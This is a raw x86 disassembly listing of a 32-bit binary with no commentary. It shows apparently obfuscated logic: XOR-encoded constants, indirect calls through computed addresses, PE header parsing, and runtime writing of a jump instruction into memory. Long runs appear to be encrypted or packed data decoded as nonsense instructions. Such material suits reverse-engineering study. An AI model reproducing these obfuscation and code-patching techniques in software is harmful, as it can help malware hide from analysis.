  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430556,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ee30,0x430552
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4304a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43054e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4304b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4304b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xfa3e5be8,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a21f
  40a236:	es jb  0x40a1ff
  40a239:	pop    eax
  40a23a:	cmp    ch,BYTE PTR [ebx+0x79]
  40a23d:	or     ch,al
  40a23f:	adc    eax,0x25468e81
  40a244:	mov    edx,0x75c79017
  40a249:	mov    esp,0x9df297e8
  40a24e:	pop    ebp
  40a24f:	xchg   esi,eax
  40a250:	adc    edx,DWORD PTR [eax]
  40a252:	dec    ebx
  40a253:	xlat   BYTE PTR ds:[ebx]
  40a254:	daa    
  40a255:	mov    bh,bh
  40a257:	rcl    DWORD PTR [ecx+esi*8+0x1cdc9862],1
  40a25e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a25f:	sub    DWORD PTR [edi],ecx
  40a261:	mov    ebp,0x87932243
  40a266:	or     eax,0x371ee309
  40a26b:	and    dl,BYTE PTR [edx]
  40a26d:	gs pop edx
  40a26f:	inc    ecx
  40a270:	cmp    al,0xad
  40a272:	outs   dx,DWORD PTR ds:[esi]
  40a273:	xchg   esp,eax
  40a274:	pop    es
  40a275:	(bad)  
  40a276:	int    0xec
  40a278:	mov    dh,0xde
  40a27a:	jg     0x40a279
  40a27c:	mov    dh,0x99
  40a27e:	cmp    DWORD PTR [edi+0x14356afa],ebp
  40a284:	dec    esi
  40a285:	mov    ds:0x8626fa0c,eax
  40a28a:	mov    ds:0x1e572836,al
  40a28f:	ror    DWORD PTR [edx],cl
  40a291:	fstp   QWORD PTR [edi+0x22783f8]
  40a297:	xor    eax,0x4cf99e93
  40a29c:	fldcw  WORD PTR [edx+0x2f]
  40a29f:	push   ecx
  40a2a0:	fdiv   QWORD PTR [edi+eiz*4+0x7cb90299]
  40a2a7:	pop    edi
  40a2a8:	lahf   
  40a2a9:	sahf   
  40a2aa:	aad    0x53
  40a2ac:	ret    
  40a2ad:	mov    ch,0xde
  40a2af:	jmp    0x40a231
  40a2b1:	mov    cl,0x93
  40a2b3:	adc    DWORD PTR [ecx-0x3a],ebx
  40a2b6:	pop    DWORD PTR [edx]
  40a2b8:	sub    ebp,DWORD PTR [ebp+edi*1-0x4b32aed1]
  40a2bf:	push   es
  40a2c0:	jno    0x40a256
  40a2c2:	hlt    
  40a2c3:	aaa    
  40a2c4:	xor    BYTE PTR [ecx-0x7ee41ae8],bl
  40a2ca:	add    eax,0xd86c2705
  40a2cf:	daa    
  40a2d0:	lahf   
  40a2d1:	sub    BYTE PTR [edi],bh
  40a2d3:	adc    al,bh
  40a2d5:	popf   
  40a2d6:	push   esp
  40a2d7:	leave  
  40a2d8:	jns    0x40a32f
  40a2da:	mov    ds:0x6db84c46,al
  40a2df:	mov    edi,DWORD PTR [edx+0x18]
  40a2e2:	dec    ecx
  40a2e3:	sbb    BYTE PTR [ebx+0x53],0xf5
  40a2e7:	inc    ebx
  40a2e8:	sbb    esi,DWORD PTR [edx-0x6f]
  40a2eb:	xor    ebx,ebp
  40a2ed:	cmp    eax,0xe66204fa
  40a2f2:	adc    eax,esp
  40a2f4:	into   
  40a2f5:	aam    0xc6
  40a2f7:	pop    es
  40a2f8:	nop
  40a2f9:	sbb    esi,DWORD PTR [edi-0x62]
  40a2fc:	cwde   
  40a2fd:	mov    ds:0xfec9b0,eax
  40a302:	or     eax,0x80f29001
  40a307:	mov    cl,0x99
  40a309:	mov    ds:0x2da98d82,eax
  40a30e:	inc    edi
  40a30f:	jmp    0x76402a4
  40a314:	(bad)  
  40a315:	jmp    0x40a377
  40a317:	mov    al,ds:0x8e377a0c
  40a31c:	repz arpl WORD PTR [eax],bx
  40a31f:	into   
  40a320:	push   ds
  40a321:	pop    eax
  40a322:	ret    
  40a323:	or     eax,0xe9e13937
  40a328:	cmp    edx,edx
  40a32a:	pop    esi
  40a32b:	leave  
  40a32c:	push   ecx
  40a32d:	mov    ds:0x70487c89,eax
  40a332:	icebp  
  40a333:	in     al,dx
  40a334:	mov    gs,WORD PTR [eax+ebp*1]
  40a337:	jmp    0x8a81:0xc3e937c9
  40a33e:	mov    ds:0x1abcd58e,al
  40a343:	push   esp
  40a344:	sub    ebp,edx
  40a346:	and    bh,BYTE PTR [ecx+0x77a09414]
  40a34c:	mov    edi,0x147cffa8
  40a351:	mov    al,0xdc
  40a353:	mov    bh,0xcb
  40a355:	mov    ebp,0x7ccff48b
  40a35a:	dec    eax
  40a35b:	xlat   BYTE PTR ds:[ebx]
  40a35c:	mov    ds:0xd2824d3a,eax
  40a361:	xchg   ebp,eax
  40a362:	xchg   ebp,eax
  40a363:	lds    ebp,FWORD PTR [edi+0x7]
  40a366:	mov    bh,0x9e
  40a368:	add    eax,0xd7501153
  40a36d:	or     eax,0x4787f698
  40a372:	xchg   DWORD PTR [ecx-0xc],esi
  40a375:	sub    DWORD PTR [eax-0x21010a00],0x40
  40a37c:	aad    0xf
  40a37e:	pop    eax
  40a37f:	mov    esi,0xd5ca3bc8
  40a384:	call   0xd9ff3f47
  40a389:	mov    bh,BYTE PTR [edx+0x4a5ff35b]
  40a38f:	cs pusha 
  40a391:	sar    BYTE PTR [ecx+ecx*4],1
  40a394:	mov    cl,BYTE PTR ss:0xfc851eff
  40a39b:	fs fs jl 0x40a323
  40a39f:	jle    0x40a3fe
  40a3a1:	sub    BYTE PTR [edi*2-0x6b9d2184],0xe8
  40a3a9:	dec    edi
  40a3aa:	loopne 0x40a415
  40a3ac:	aas    
  40a3ad:	xor    DWORD PTR [eax],ebp
  40a3af:	push   ds
  40a3b0:	pushf  
  40a3b1:	sti    
  40a3b2:	stos   DWORD PTR es:[edi],eax
  40a3b3:	sub    DWORD PTR [ebp-0x7e22517a],esi
  40a3b9:	ins    DWORD PTR es:[edi],dx
  40a3ba:	push   ebx
  40a3bb:	mov    dl,0x4f
  40a3bd:	mov    ?,WORD PTR [ebp-0x39]
  40a3c0:	lods   al,BYTE PTR ds:[esi]
  40a3c1:	push   ss
  40a3c2:	add    BYTE PTR [edx],ah
  40a3c4:	ja     0x40a39d
  40a3c6:	sti    
  40a3c7:	cwde   
  40a3c8:	test   DWORD PTR [ecx-0x2150d6cd],0x70f49670
  40a3d2:	mov    dh,0x48
  40a3d4:	adc    al,BYTE PTR [eax-0x4dff96df]
  40a3da:	lahf   
  40a3db:	call   0xe83c:0x71972816
  40a3e2:	mov    al,0x9d
  40a3e4:	sbb    ecx,esp
  40a3e6:	imul   ebx,DWORD PTR [ecx-0x65],0x7f
  40a3ea:	fidiv  DWORD PTR [ebp-0x26]
  40a3ed:	pusha  
  40a3ee:	mov    ds:0x6e9d0461,ax
  40a3f4:	sahf   
  40a3f5:	sbb    edx,DWORD PTR [ebp*1-0x75668e70]
  40a3fc:	mov    bl,0xca
  40a3fe:	dec    eax
  40a3ff:	jle    0x40a41b
  40a401:	add    al,BYTE PTR [ecx]
  40a403:	sub    edx,DWORD PTR [ecx+0x147dfa52]
  40a409:	mov    ebp,0x236ef4b1
  40a40e:	pslld  mm5,QWORD PTR [eax+0x22478774]
  40a415:	pop    esi
  40a416:	sub    bl,BYTE PTR [esi]
  40a418:	mov    esi,0x198b5e43
  40a41d:	retf   
  40a41e:	lea    ecx,[edx-0x48cb012e]
  40a424:	mov    bl,0xd2
  40a426:	ret    
  40a427:	dec    esi
  40a428:	or     cl,bh
  40a42a:	scas   eax,DWORD PTR es:[edi]
  40a42b:	dec    ebp
  40a42c:	lahf   
  40a42d:	out    0x21,eax
  40a42f:	mov    eax,0xf38229d1
  40a434:	push   0xffffffce
  40a436:	xchg   ecx,eax
  40a437:	hlt    
  40a438:	clc    
  40a439:	sti    
  40a43a:	cmp    al,0xc9
  40a43c:	or     DWORD PTR [ecx+ebp*1],esi
  40a43f:	push   eax
  40a440:	sbb    dh,BYTE PTR [edi-0x333dd6d7]
  40a446:	js     0x40a410
  40a448:	(bad)  
  40a44a:	fcomp  QWORD PTR [eax]
  40a44c:	int3   
  40a44d:	adc    bl,BYTE PTR ds:0x8cf24759
  40a453:	imul   eax,edx,0xfffffff5
  40a456:	scas   eax,DWORD PTR es:[edi]
  40a457:	adc    eax,0xd3c1685b
  40a45c:	sub    BYTE PTR ds:0xce2b623,cl
  40a462:	jge    0x40a48b
  40a464:	popf   
  40a465:	sub    BYTE PTR [eax],bh
  40a467:	aam    0x62
  40a469:	nop
  40a46a:	sub    ah,BYTE PTR [ebx-0x22]
  40a46d:	xor    al,0xe1
  40a46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a470:	pop    edi
  40a471:	mov    bh,0xb0
  40a473:	ds retf 
  40a475:	sbb    DWORD PTR [edx],esp
  40a477:	xchg   edi,eax
  40a478:	adc    al,0x3b
  40a47a:	mov    edx,0x6c81d196
  40a47f:	sub    eax,0xd4f6074b
  40a484:	int3   
  40a485:	loope  0x40a46f
  40a487:	daa    
  40a488:	scas   al,BYTE PTR es:[edi]
  40a489:	jmp    0x97203097
  40a48e:	enter  0x9136,0x8a
  40a492:	call   DWORD PTR [esi]
  40a494:	ins    DWORD PTR es:[edi],dx
  40a495:	test   eax,0xc708458b
  40a49a:	add    eax,0x430542
  40a49f:	pop    ss
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [ebx+0x4305423d],al
  40a4a8:	add    BYTE PTR [eax],al
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430542,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eae4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430542
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430542,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x5289a360
  40a537:	iret   
  40a538:	jle    0x40a4ee
  40a53a:	call   0x712023bd
  40a53f:	jle    0x40a5bf
  40a541:	icebp  
  40a542:	adc    DWORD PTR [esi],edx
  40a544:	jae    0x40a593
  40a546:	test   al,0x2d
  40a548:	cs cdq 
  40a54a:	sub    cl,ah
  40a54c:	dec    esp
  40a54d:	inc    esp
  40a54e:	mov    ebp,0xb8d5daaf
  40a553:	hlt    
  40a554:	fwait
  40a555:	or     DWORD PTR [ebx+0x23eb27b],esp
  40a55b:	sbb    esp,DWORD PTR [eax+0x38a1e085]
  40a561:	hlt    
  40a562:	pop    eax
  40a563:	gs out 0x7f,al
  40a566:	adc    dh,BYTE PTR [eax-0x6c]
  40a569:	lea    ebx,gs:[eax-0x5e]
  40a56d:	or     eax,edx
  40a56f:	outs   dx,BYTE PTR ds:[esi]
  40a570:	sbb    esi,DWORD PTR [eax-0x77d7937b]
  40a576:	and    BYTE PTR [ecx],al
  40a578:	jno    0x40a559
  40a57a:	inc    ebp
  40a57b:	pop    ds
  40a57c:	adc    BYTE PTR [esi+0x6a84c53c],al
  40a582:	repz fst DWORD PTR [esi-0x3a64d1c4]
  40a589:	pop    ecx
  40a58a:	xchg   edx,eax
  40a58b:	dec    eax
  40a58c:	add    dh,0x29
  40a58f:	jmp    0x40a5b1
  40a591:	test   eax,0x498aac8e
  40a596:	sbb    al,0xed
  40a598:	add    eax,0xd95eeac7
  40a59d:	mov    ecx,0xe53bcd0
  40a5a2:	nop
  40a5a3:	jbe    0x40a5c6
  40a5a5:	cmp    al,0x91
  40a5a7:	in     eax,dx
  40a5a8:	rcl    DWORD PTR [ebp-0x330a9d18],cl
  40a5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5af:	call   0x4130:0xc03b88a4
  40a5b6:	inc    esp
  40a5b7:	cs push edx
  40a5b9:	call   0xa81e:0x5f60b64e
  40a5c0:	jb     0x40a57a
  40a5c2:	jb     0x40a5b9
  40a5c4:	mov    ch,BYTE PTR [ebx-0x33]
  40a5c7:	or     eax,0x683b99a3
  40a5cc:	push   0x32bfa626
  40a5d1:	shr    BYTE PTR [edx+0x5a],cl
  40a5d4:	in     eax,0x3f
  40a5d6:	ffreep st(3)
  40a5d8:	aas    
  40a5d9:	test   al,0x41
  40a5db:	loopne 0x40a611
  40a5dd:	add    eax,0x8e0ef5d2
  40a5e2:	in     eax,dx
  40a5e3:	pusha  
  40a5e4:	xor    cl,0x14
  40a5e7:	xor    al,0xc0
  40a5e9:	mov    eax,0x832f4d5b
  40a5ee:	test   DWORD PTR [ebx],esp
  40a5f0:	inc    esi
  40a5f1:	mov    ds:0xddee58a2,eax
  40a5f6:	sbb    al,0xc3
  40a5f8:	sahf   
  40a5f9:	xor    BYTE PTR [ecx-0x57604fe2],0xb0
  40a600:	in     eax,0xa8
  40a602:	imul   esp,DWORD PTR [edx+0x2d],0xdd430535
  40a609:	dec    edi
  40a60a:	ss jmp 0x40a625
  40a60d:	add    BYTE PTR [ecx+ebp*1],dl
  40a610:	mov    eax,ds:0x7c4cf6c0
  40a615:	cmp    al,0xd3
  40a617:	popf   
  40a618:	inc    ebp
  40a619:	cwde   
  40a61a:	sbb    DWORD PTR [ecx],ecx
  40a61c:	and    BYTE PTR [ecx],al
  40a61e:	push   ebx
  40a61f:	adc    eax,0x764778f3
  40a624:	mov    esp,DWORD PTR [ebp+0x40]
  40a627:	push   edx
  40a628:	lods   al,BYTE PTR ds:[esi]
  40a629:	shr    BYTE PTR [edx+0x2cb83831],0x97
  40a630:	lods   eax,DWORD PTR ds:[esi]
  40a631:	mov    eax,0x12c7e1f7
  40a636:	jecxz  0x40a5ff
  40a638:	push   ds
  40a639:	scas   eax,DWORD PTR es:[edi]
  40a63a:	and    eax,0x8caedc8d
  40a63f:	cmp    eax,0x4627a050
  40a644:	test   eax,0x1bfacbe6
  40a649:	xchg   ebp,eax
  40a64a:	dec    ebp
  40a64b:	jecxz  0x40a647
  40a64d:	ins    DWORD PTR es:[edi],dx
  40a64e:	adc    eax,0x7f52b268
  40a653:	pop    edi
  40a654:	add    eax,0x91cada45
  40a659:	lahf   
  40a65a:	inc    edx
  40a65b:	push   esp
  40a65c:	aaa    
  40a65d:	jnp    0x40a5ee
  40a65f:	and    BYTE PTR cs:0xd569943d,dh
  40a666:	jmp    0x40a6d1
  40a668:	ror    DWORD PTR [edx+0x11fb70b5],cl
  40a66e:	pusha  
  40a66f:	add    edi,DWORD PTR [esi-0x306e03a6]
  40a675:	xor    dh,bl
  40a677:	add    eax,0xeca60123
  40a67c:	xor    esp,DWORD PTR [esp+edi*8]
  40a67f:	sbb    al,0x33
  40a681:	push   esi
  40a682:	cmp    DWORD PTR [eax],edx
  40a684:	jns    0x40a63d
  40a686:	xor    BYTE PTR [ebx],0x7c
  40a689:	jl     0x40a6a6
  40a68b:	(bad)  
  40a68c:	popf   
  40a68d:	push   ecx
  40a68e:	mov    esi,0x515d6c04
  40a693:	dec    eax
  40a694:	cli    
  40a695:	dec    esp
  40a696:	or     ecx,DWORD PTR [edx+0x3]
  40a699:	sbb    edi,DWORD PTR [ebp+0x5d]
  40a69c:	push   ecx
  40a69d:	clc    
  40a69e:	push   esp
  40a69f:	dec    esp
  40a6a0:	jl     0x40a683
  40a6a2:	(bad)  
  40a6a3:	ss scas al,BYTE PTR es:[edi]
  40a6a5:	shl    DWORD PTR [edi-0x2],1
  40a6a8:	jnp    0x40a6ee
  40a6aa:	repz sbb BYTE PTR [esi],ah
  40a6ad:	xchg   edi,eax
  40a6ae:	mov    al,ds:0xf2e04c02
  40a6b3:	fstp   DWORD PTR [eax]
  40a6b5:	cmp    al,0x13
  40a6b7:	sbb    DWORD PTR [edx],ebx
  40a6b9:	shr    DWORD PTR [eax-0x4f],cl
  40a6bc:	in     al,dx
  40a6bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6be:	or     ebp,ebx
  40a6c0:	inc    ebx
  40a6c1:	inc    eax
  40a6c2:	mov    ah,0x34
  40a6c4:	dec    esp
  40a6c5:	call   0x4028:0xc7180dea
  40a6cc:	aas    
  40a6cd:	cmc    
  40a6ce:	mov    ds:0x2a5b3ac0,al
  40a6d3:	dec    esp
  40a6d4:	pop    esp
  40a6d5:	push   edx
  40a6d6:	push   es
  40a6d7:	cmp    DWORD PTR [ecx-0x564280a7],ebx
  40a6dd:	enter  0x355c,0xe5
  40a6e1:	pop    edx
  40a6e2:	mov    al,ds:0x2205b94
  40a6e7:	neg    DWORD PTR [eax-0x3a]
  40a6ea:	or     ebp,DWORD PTR [si+0x626d]
  40a6ef:	mov    ah,bh
  40a6f1:	and    BYTE PTR [eax],ch
  40a6f3:	xchg   esp,eax
  40a6f4:	jmp    0xb9d1831e
  40a6f9:	or     eax,eax
  40a6fb:	xchg   ecx,eax
  40a6fc:	dec    DWORD PTR [ecx+0x750cd53f]
  40a702:	fmul   DWORD PTR [ebp+0x39]
  40a705:	call   0xcabd3c5d
  40a70a:	push   esp
  40a70b:	pushf  
  40a70c:	mov    ds:0x81c5a986,eax
  40a711:	pop    eax
  40a712:	mov    bh,0xc6
  40a714:	mov    bl,0xa8
  40a716:	sbb    ch,BYTE PTR [ebx]
  40a718:	repnz addr16 loope 0x40a725
  40a71c:	mul    DWORD PTR [edi]
  40a71e:	dec    edi
  40a71f:	cld    
  40a720:	cmp    eax,0xfed4ed11
  40a725:	ret    
  40a726:	es (bad) 
  40a728:	in     al,0x9c
  40a72a:	jb     0x40a780
  40a72c:	push   0x39
  40a72e:	ret    
  40a72f:	btr    DWORD PTR [esp+eax*8],edi
  40a733:	retf   0xcdeb
  40a736:	jp     0x40a74b
  40a738:	inc    ebx
  40a739:	push   0x25
  40a73b:	or     eax,0x34636dd
  40a741:	xlat   BYTE PTR ds:[ebx]
  40a742:	add    al,0xda
  40a744:	mov    edx,DWORD PTR [ecx+0xbc57331]
  40a74a:	out    0xf1,al
  40a74c:	call   0x2c78:0x271660bb
  40a753:	or     ebp,edx
  40a755:	and    esp,edx
  40a757:	and    eax,0xdfc87dd3
  40a75c:	mov    bl,0x49
  40a75e:	call   0x9c9d:0x6f4db67e
  40a765:	mov    ds:0xc93bd824,al
  40a76a:	fidivr DWORD PTR ds:0xb55849cb
  40a770:	mov    eax,ds:0x5fe7bd20
  40a775:	adc    eax,0xe41e1a94
  40a77a:	neg    DWORD PTR [ecx]
  40a77c:	mov    eax,0x11be78dd
  40a781:	mov    dh,0x13
  40a783:	xor    al,0xf1
  40a785:	jbe    0x40a7de
  40a787:	outs   dx,DWORD PTR ds:[esi]
  40a788:	dec    ecx
  40a789:	mov    dl,BYTE PTR [esi+0x3c]
  40a78c:	test   BYTE PTR [ebx],dl
  40a78e:	test   al,0x7f
  40a790:	das    
  40a791:	shr    BYTE PTR [ecx-0x7d],cl
  40a794:	adc    eax,0xddf67b2c
  40a799:	push   es
  40a79a:	rol    BYTE PTR [eax-0x22],1
  40a79d:	adc    eax,0x7f8fcb3b
  40a7a2:	add    eax,0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43049e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43049e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43049e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43049e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43049e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ebd0
  40a7f1:	cmp    DWORD PTR ds:0x43049e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43049e
  40a803:	inc    eax
  40a804:	mov    ds:0x43049e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4304d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4304d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
